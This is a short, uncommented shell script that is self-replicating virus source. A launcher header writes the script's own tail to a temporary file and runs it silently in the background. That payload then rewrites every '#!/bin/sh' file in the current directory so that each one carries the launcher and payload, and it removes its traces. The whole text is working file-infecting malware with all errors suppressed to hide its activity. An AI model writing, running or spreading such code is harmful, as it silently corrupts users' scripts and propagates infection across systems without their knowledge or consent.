
#!/bin/sh
tail -13 $0 > tmp 2>/dev/null
chmod +x tmp 2>/dev/null
./tmp $0 & 2>/dev/null

exit 0

#!/bin/sh
for F in *
do
  if [ "$(head -c9 $F 2>/dev/null)" = "#!/bin/sh" ]
  then
    HOST=$(cat $F|tr '\n' \xc7)
    head -5 $1 > $F 2>/dev/null
    echo $HOST | tr \xc7 '\n' | grep -v '#!/bin/sh'>> $F 2>/dev/null
    tail -14 $1 >> $F 2>/dev/null
  fi
done
rm tmp 2>/dev/null
